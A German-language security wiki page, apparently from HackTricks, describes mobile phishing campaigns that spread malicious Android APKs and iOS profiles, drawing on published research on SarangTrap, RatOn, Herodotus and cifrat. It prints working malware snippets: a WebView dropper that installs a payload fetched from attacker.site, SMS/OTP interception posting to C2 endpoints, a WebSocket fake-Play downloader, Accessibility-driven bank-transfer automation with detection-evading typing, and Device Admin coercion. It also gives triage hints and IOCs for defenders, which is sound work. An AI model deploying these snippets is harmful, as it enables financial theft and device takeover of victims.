# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Threat Actors verwendet werden, um **malicious Android APKs** und **iOS mobile-configuration profiles** durch Phishing (SEO, Social Engineering, fake stores, dating apps, etc.) zu verteilen.
> Das Material basiert auf der SarangTrap-Kampagne, die von Zimperium zLabs (2025) aufgedeckt wurde, sowie auf weiterer öffentlicher Forschung.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Dutzende ähnlich aussehende Domains registrieren (dating, cloud share, car service…).
– Lokale Sprach-Keywords und Emojis im `<title>`-Element verwenden, um in Google zu ranken.
– *Sowohl* Android (`.apk`) als auch iOS-Installationsanweisungen auf derselben Landing Page hosten.
2. **First Stage Download**
* Android: direkter Link zu einer *unsigned* oder „third-party store“ APK.
* iOS: `itms-services://` oder ein einfacher HTTPS-Link zu einem malicious **mobileconfig** profile (siehe unten).
3. **Post-install Social Engineering**
* Beim ersten Start fragt die App nach einem **invitation / verification code** (Illusion eines exklusiven Zugangs).
* Der Code wird per **POST over HTTP** an die Command-and-Control (C2) gesendet.
* C2 antwortet `{"success":true}` ➜ malware läuft weiter.
* Sandbox / AV dynamic analysis, die nie einen gültigen Code übermittelt, sieht **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Gefährliche Berechtigungen werden erst **nach positiver C2-Antwort** angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus `AndroidManifest.xml`** lassen aber den Java/Kotlin-Codepfad, der SMS per Reflection liest, bestehen ⇒ senkt den statischen Score, bleibt aber auf Geräten funktional, die die Berechtigung über `AppOps` abuse oder alte Targets gewähren.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 führte **Restricted settings** für sideloaded apps ein: Accessibility- und Notification-Listener-Schalter sind ausgegraut, bis der Nutzer restricted settings in **App info** explizit erlaubt.
* Phishing-Seiten und Droppers liefern jetzt Schritt-für-Schritt-UI-Anweisungen mit, um für die sideloaded app **allow restricted settings** zu aktivieren und danach Accessibility/Notification access einzuschalten.
* Ein neuerer Bypass besteht darin, die Payload über einen **session-based PackageInstaller flow** zu installieren (dieselbe Methode, die app stores verwenden). Android behandelt die App dann als store-installed, sodass Restricted settings Accessibility nicht mehr blockiert.
* Triage-Hinweis: In einem Dropper nach `PackageInstaller.createSession/openSession` sowie nach Code suchen, der das Opfer direkt zu `ACTION_ACCESSIBILITY_SETTINGS` oder `ACTION_NOTIFICATION_LISTENER_SETTINGS` navigiert.

6. **Facade UI & Background Collection**
* App zeigt harmlose Ansichten (SMS viewer, gallery picker), lokal implementiert.
* Gleichzeitig exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Vollständigen `ContactsContract`-Dump (JSON array)
- JPEG/PNG aus `/sdcard/DCIM`, mit [Luban](https://github.com/Curzibn/Luban) komprimiert, um die Größe zu reduzieren
- Optionalen SMS-Inhalt (`content://sms`)
Payloads werden **batch-zipped** und per `HTTP POST /upload.php` gesendet.
7. **iOS Delivery Technique**
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. anfordern, um das Gerät in eine „MDM“-ähnliche supervision aufzunehmen.
* Social-Engineering-Anweisungen:
1. Öffne Settings ➜ *Profile downloaded*.
2. Tippe dreimal auf *Install* (Screenshots auf der Phishing-Seite).
3. Trust the unsigned profile ➜ der Angreifer erhält *Contacts* & *Photo* entitlement ohne App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed`-Payloads können eine phishing URL mit einem gebrandeten Icon/Label auf dem Home Screen **anpinnen**.
* Web Clips können **full-screen** laufen (versteckt die Browser-UI) und als **non-removable** markiert werden, wodurch das Opfer das Profil löschen muss, um das Icon zu entfernen.
9. **Network Layer**
* Plain HTTP, oft auf Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht erkennbar).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Während der malware-Bewertung den invitation code phase mit Frida/Objection automatisieren, um den malicious branch zu erreichen.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` mit `PackageManager#getRequestedPermissions()` zur Laufzeit vergleichen; fehlende gefährliche perms sind ein Warnsignal.
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` konfigurieren, um unsolid POST bursts nach Code-Eingabe zu erkennen.
* **mobileconfig Inspection** – `security cms -D -i profile.mobileconfig` auf macOS verwenden, um `PayloadContent` aufzulisten und übermäßige entitlements zu erkennen.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatoren (Allgemein)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Dieses Muster wurde in Kampagnen beobachtet, die Government-benefit-Themen missbrauchen, um indische UPI-Zugangsdaten und OTPs zu stehlen. Die Operatoren verketteten renommierte Plattformen für Auslieferung und Resilienz.

### Delivery chain across trusted platforms
- YouTube video lure → description enthält einen short link
- Shortlink → GitHub Pages phishing site, die das legit portal imitiert
- Dasselbe GitHub-Repo hostet ein APK mit einem gefälschten „Google Play“-Badge, das direkt auf die Datei verlinkt
- Dynamische phishing pages laufen auf Replit; der remote command channel nutzt Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Das erste APK ist ein Installer (dropper), der die eigentliche malware unter `assets/app.apk` mitliefert und den Nutzer auffordert, Wi‑Fi/mobile data zu deaktivieren, um cloud detection zu erschweren.
- Die eingebettete payload installiert sich unter einem unauffälligen Label (z. B. „Secure Update“). Nach der Installation sind sowohl der Installer als auch die payload als separate Apps vorhanden.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamische Endpunkt-Erkennung via shortlink
- Malware ruft eine Klartext-, kommagetrennte Liste aktiver Endpunkte von einem shortlink ab; einfache String-Transformationen erzeugen den finalen Pfad der Phishing-Seite.

Beispiel (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-Code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-basierte UPI-Anmeldedaten-Extraktion
- Der Schritt „Make payment of ₹1 / UPI‑Lite“ lädt ein HTML-Formular des Angreifers aus dem dynamischen Endpunkt innerhalb eines WebView und erfasst sensible Felder (Telefon, Bank, UPI PIN), die per `POST` an `addup.php` gesendet werden.

Minimaler Loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Selbstverbreitung und SMS/OTP-Abfangen
- Beim ersten Start werden aggressive Berechtigungen angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden verwendet, um smishing-SMS in Masse vom Gerät des Opfers zu versenden.
- Eingehende SMS werden von einem broadcast receiver abgefangen und zusammen mit Metadaten (Absender, Body, SIM-Slot, pro-Gerät zufällige ID) an `/addsm.php` hochgeladen.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als resilient C2
- Die Payload registriert sich bei FCM; Push-Nachrichten enthalten ein `_type`-Feld, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. Phishing-Textvorlagen aktualisieren, Verhaltensweisen umschalten).

Beispiel für FCM-Payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK enthält sekundäre Payload unter `assets/app.apk`
- WebView lädt Zahlung von `gate.htm` und exfiltriert zu `/addup.php`
- SMS-Exfiltration zu `/addsm.php`
- Shortlink-getriebener Config-Fetch (z. B. `rebrand.ly/*`), der CSV-Endpunkte zurückgibt
- Apps, die als generische „Update/Secure Update“ bezeichnet sind
- FCM `data` messages mit einem `_type`-Discriminator in nicht vertrauenswürdigen Apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Angreifer ersetzen zunehmend statische APK-Links durch einen Socket.IO/WebSocket-Kanal, der in Google Play–ähnliche Köder eingebettet ist. Das verschleiert die Payload-URL, umgeht URL-/Extension-Filter und erhält eine realistische Installations-UX.

Typischer beobachteter Client-Flow in der Praxis:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; die Nutzlast wird aus WebSocket-Frames im Speicher rekonstruiert.
- URL/MIME-/Extension-Filter, die direkte .apk-Antworten blockieren, übersehen möglicherweise Binärdaten, die über WebSockets/Socket.IO getunnelt werden.
- Crawler und URL-Sandboxes, die WebSockets nicht ausführen, werden die Nutzlast nicht abrufen.

Siehe auch WebSocket tradecraft und tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Die RatOn banker/RAT-Kampagne (ThreatFabric) ist ein konkretes Beispiel dafür, wie moderne mobile phishing-Operationen WebView dropper, Accessibility-gesteuerte UI-Automatisierung, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover und sogar NFC-relay orchestration kombinieren. Dieser Abschnitt abstrahiert die wiederverwendbaren Techniken.

### Stage-1: WebView → native install bridge (dropper)
Angreifer präsentieren ein WebView, das auf eine Angreifer-Seite zeigt, und injizieren eine JavaScript interface, die einen nativen installer bereitstellt. Ein Tap auf einen HTML-Button ruft nativen Code auf, der eine zweite APK installiert, die in den Assets des droppers gebündelt ist, und startet sie dann direkt.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML auf der Seite:
```html
<button onclick="bridge.installApk()">Install</button>
```
Nach der Installation startet der Dropper die Payload über explizit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting-Idee: nicht vertrauenswürdige Apps rufen `addJavascriptInterface()` auf und exponieren installer-ähnliche Methoden für WebView; APK liefert eine eingebettete sekundäre Payload unter `assets/` aus und verwendet die Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + nachfolgende Runtime-Prompts
Stage-2 öffnet eine WebView, die eine „Access“-Seite hostet. Deren Button ruft eine exportierte Methode auf, die das Opfer zu den Accessibility-Einstellungen navigiert und das Aktivieren des bösartigen Dienstes anfordert. Sobald dies gewährt ist, verwendet die Malware Accessibility, um nachfolgende Runtime-Permission-Dialoge automatisch durchzuklicken (Kontakte, Overlay, system settings verwalten usw.) und fordert Device Admin an.

- Accessibility hilft programmatisch dabei, spätere Prompts zu akzeptieren, indem Buttons wie „Allow“/„OK“ im Node-Tree gefunden und Klicks ausgelöst werden.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Siehe auch:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators können Befehle ausgeben, um:
- ein Full-Screen-Overlay von einer URL zu rendern oder
- Inline-HTML zu übergeben, das in ein WebView-Overlay geladen wird.

Wahrscheinliche Verwendungen: coercion (PIN-Eingabe), wallet öffnen, um PINs abzugreifen, ransom messages. Behalte einen Befehl bereit, um sicherzustellen, dass Overlay permission gewährt wird, falls sie fehlt.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodisch den Accessibility node tree dumpen, sichtbare Texte/roles/bounds serialisieren und als Pseudo-Screen an C2 senden (Befehle wie `txt_screen` einmalig und `screen_live` kontinuierlich).
- High-fidelity: MediaProjection anfordern und auf Abruf screen-casting/recording starten (Befehle wie `display` / `record`).

### ATS playbook (bank app automation)
Gegeben eine JSON-Aufgabe, die Bank-App öffnen, die UI per Accessibility mit einer Mischung aus Textabfragen und Coordinate-Taps steuern und bei Aufforderung die payment PIN des Opfers eingeben.

Beispielaufgabe:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Beispieltexte, die in einem Ziel-Flow gesehen werden (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- Aktuelle Anmeldedaten ablaufen lassen, um eine Änderung zu erzwingen (Accessibility erfasst neue PIN/neues Passwort):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Erzwinge das Entsperren ohne Biometrie, indem du die biometrischen Keyguard-Funktionen deaktivierst:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Hinweis: Viele DevicePolicyManager-Steuerungen erfordern auf neueren Android-Geräten Device Owner/Profile Owner; einige OEM-Builds können nachlässig sein. Immer auf dem Ziel-OS/OEM validieren.

### NFC relay orchestration (NFSkate)
Stage-3 kann ein externes NFC-relay-Modul (z. B. NFSkate) installieren und starten und ihm sogar eine HTML-Vorlage übergeben, um das Opfer während des Relay zu führen. Das ermöglicht kontaktloses card-present cash-out zusammen mit online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors kombinieren zunehmend Accessibility-driven automation mit Anti-Detection, abgestimmt auf einfache behaviour biometrics. Ein jüngerer banker/RAT zeigt zwei komplementäre Textübermittlungsmodi und einen Operator-Schalter, um menschliches Tippen mit zufälliger cadence zu simulieren.

- Discovery mode: sichtbare nodes mit Selektoren und bounds auflisten, um Inputs präzise anzusteuern (ID, text, contentDescription, hint, bounds), bevor gehandelt wird.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` direkt auf dem Ziel-Node (stabil, ohne keyboard);
- Mode 2 – clipboard setzen + `ACTION_PASTE` in den fokussierten Node (funktioniert, wenn direktes setText blockiert ist).
- Human-like cadence: die vom Operator vorgegebene Zeichenkette aufteilen und Zeichen für Zeichen mit zufälligen Verzögerungen von 300–3000 ms zwischen den Events übermitteln, um Heuristiken für „machine-speed typing“ zu umgehen. Implementiert entweder durch schrittweises Erweitern des Werts via `ACTION_SET_TEXT` oder durch Einfügen eines Zeichens nach dem anderen.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays blockieren für Betrug umfassen:
- Rendere ein vollbildiges `TYPE_ACCESSIBILITY_OVERLAY` mit vom Operator gesteuerter Deckkraft; halte es für das Opfer undurchsichtig, während die Remote-Automatisierung darunter weiterläuft.
- Typischerweise exponierte Befehle: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimales Overlay mit anpassbarem Alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Multi-stage Android dropper with WebView bridge, JNI string decoder, and staged DEX loading

CERT Polskas Analyse vom 03. April 2026 zu **cifrat** ist ein gutes Referenzbeispiel für einen modernen, per Phishing ausgelieferten Android-Loader, bei dem das sichtbare APK nur eine Installer-Hülle ist. Das wiederverwendbare Tradecraft ist nicht der Familienname, sondern die Art, wie die Stages verkettet sind:

1. Die Phishing-Seite liefert ein Lure-APK aus.
2. Stage 0 fordert `REQUEST_INSTALL_PACKAGES` an, lädt ein natives `.so`, entschlüsselt ein eingebettetes Blob und installiert Stage 2 mit **PackageInstaller sessions**.
3. Stage 2 entschlüsselt ein weiteres verstecktes Asset, behandelt es als ZIP und **lädt DEX dynamisch** für den finalen RAT.
4. Die Final-Stage missbraucht Accessibility/MediaProjection und verwendet WebSockets für Control/Data.

### WebView JavaScript bridge as the installer controller

Anstatt WebView nur für Fake-Branding zu verwenden, kann das Lure eine Bridge bereitstellen, über die eine lokale/entfernte Seite das Gerät fingerprinten und native Installationslogik auslösen kann:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage-Ideen:
- grep nach `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` und remote phishing URLs, die in derselben activity verwendet werden
- achte auf Bridges, die installer-ähnliche Methoden exponieren (`start`, `install`, `openAccessibility`, `requestOverlay`)
- wenn die Bridge von einer phishing page unterstützt wird, behandle sie als operator/controller surface, nicht nur als UI

### Native string decoding registriert in `JNI_OnLoad`

Ein nützliches Muster ist eine Java-Methode, die harmlos aussieht, aber tatsächlich durch `RegisterNatives` während `JNI_OnLoad` unterstützt wird. In cifrat ignorierte der Decoder das erste Zeichen, nutzte das zweite als 1-Byte-XOR-Key, hex-dekodierte den Rest und transformierte jedes Byte als `((b - i) & 0xff) ^ key`.

Minimale Offline-Reproduktion:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Verwende dies, wenn du Folgendes siehst:
- wiederholte Aufrufe an eine native-gestützte Java-Methode für URLs, package names oder keys
- `JNI_OnLoad`, das Klassen auflöst und `RegisterNatives` aufruft
- keine aussagekräftigen Klartext-Strings in DEX, aber viele kurze hex-ähnliche Konstanten, die an einen Helper übergeben werden

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Diese Familie nutzte zwei Unpacking-Layer, die sich allgemein gut jagen lassen:

- **Stage 0**: entschlüssle `res/raw/*.bin` mit einem XOR key, der über den native decoder abgeleitet wird, und installiere dann das Klartext-APK über `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extrahiere ein harmlos wirkendes Asset wie `FH.svg`, entschlüssle es mit einer RC4-like routine, parse das Ergebnis als ZIP und lade dann versteckte DEX-Dateien

Das ist ein starkes Indiz für eine echte dropper/loader pipeline, weil jede Layer die nächste Stage für einfaches statisches Scanning verborgen hält.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` plus `PackageInstaller` session calls
- Receivers für `PACKAGE_ADDED` / `PACKAGE_REPLACED`, um die chain nach der Installation fortzusetzen
- verschlüsselte blobs unter `res/raw/` oder `assets/` mit nicht-medialen Endungen
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling nahe bei custom decryptors

### Native anti-debugging through `/proc/self/maps`

Der native bootstrap scannte außerdem `/proc/self/maps` nach `libjdwp.so` und brach ab, falls vorhanden. Das ist ein praktischer früher anti-analysis check, weil JDWP-basiertes Debugging eine wiedererkennbare gemappte Library hinterlässt:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Ideen zur Jagd:
- native code / decompiler output nach `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu` durchsuchen
- wenn Frida hooks zu spät ankommen, zuerst `.init_array` und `JNI_OnLoad` prüfen
- anti-debug + string decoder + staged install als einen Cluster behandeln, nicht als unabhängige Findings

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
